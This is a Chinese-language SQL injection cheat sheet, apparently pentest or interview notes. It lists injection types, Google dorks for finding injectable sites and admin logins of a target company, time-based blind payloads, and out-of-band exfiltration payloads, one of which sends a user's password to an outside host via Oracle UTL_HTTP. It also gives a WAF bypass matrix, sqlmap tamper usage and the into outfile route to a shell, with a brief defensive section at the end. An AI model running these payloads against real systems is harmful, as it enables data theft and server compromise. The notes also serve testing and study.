# 04 SQL 注入

## 注入分类（面试必背）

- 按注入点：数字型 / 字符型 / 搜索型
- 按提交方式：GET / POST / Cookie / HTTP 头
- 按结果：报错注入 / 布尔盲注 / 时间盲注 / 联合查询 / 堆叠 / 宽字节 / 二次注入 / 万能密码

## 手工验证流程

```
定位带参站点 → 单引号报错 → and 1=1 / and 1=2 对比 → order by N 判断字段数 → union select 回显位 → 丢给 sqlmap
```

谷歌语法定位：`site:.com inurl:php?id=22 公司名`；后台：`inurl:admin/login.php 公司名`。

### 时间盲注方法论

1. 单引号确认注入点
2. 条件延迟逐位提取：
```sql
' AND IF(SUBSTRING(VERSION(),1,1)='5', SLEEP(5), 0) --
```
3. 各库延迟函数：MySQL `SLEEP(5)`/`BENCHMARK()`；MSSQL `WAITFOR DELAY '00:00:05'`；PostgreSQL `PG_SLEEP(5)`；Oracle `dbms_pipe.receive_message(('a'),5)`

### OOB 外带（盲注加速）

```sql
MySQL:  LOAD_FILE('\\BURP-COLLABORATOR\a')
MSSQL:  exec master..xp_dirtree '//BURP-COLLABORATOR/a'
Oracle: UTL_HTTP.request('http://collab.com/'||(SELECT password FROM users WHERE rownum=1))
```

## WAF 绕过矩阵

**无空格**：`%09(tab)` `%0A(LF)` `%0B` `%0C` `%0D` `%A0`；`/**/` 替代空格；`/*!12345UNION*//*!12345SELECT*/` 条件注释；`%20` 编码空格即可绕部分老 WAF。

**无逗号**：
```sql
LIMIT 0,1 → LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) → SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3 → UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```

**无等号**：
```sql
= → LIKE / REGEXP / BETWEEN
> → NOT BETWEEN 0 AND X
WHERE → HAVING
```

**编码组合**：urlencode、unicode、多重编码、大小写变换、换行符切断。

**sqlmap**：`--technique=T`（时间盲注）、`--tamper=space2comment` 等 tamper 脚本批量打。

## 非常规注入点（writeup 实证，34 条 SQLi writeup 归纳）

- **HTTP 头**：User-Agent、Host、Referer、X-Forwarded-For——日志记录类功能常直接拼 SQL
- **非常规接口**：忘记密码接口、上传字段的文件名、INSERT 语句的注册信息
- **二阶注入**：注册时存储 payload，在后台查询/导出处触发
- **盲注变半盲**：时间/布尔/DNS 外带（UNC 路径、dnslog）
- `load_file` / `into outfile` 拿 shell 仍是有效终点（需 secure_file_priv 配合）

## 高发位置（业务侧经验）

- 个人信息编辑、地区选择、上传头像处（JSRC 案例统计中注入最多三处）
- js 里写死的 API 路径+参数（Uber 案例：js 中的参数做二次注入）
- 头像处留意 ImageMagick 命令执行（不是 SQLi 但同位置）

## 工具

| 工具 | 用途 |
|------|------|
| sqlmap | 自动化主力 |
| Burp + SQLMapper 插件 | 流量内联 |
| Interactsh | OOB 外带收集 |
| tamper 脚本库 | WAF 绕过 |

## 防御视角（加固时用）

预编译（MyBatis 检查是否真的用了 `#{}` 而非 `${}`）、PDO 参数化、白名单过滤、统一错误信息（不回显 SQL 报错）、最小权限数据库账号。
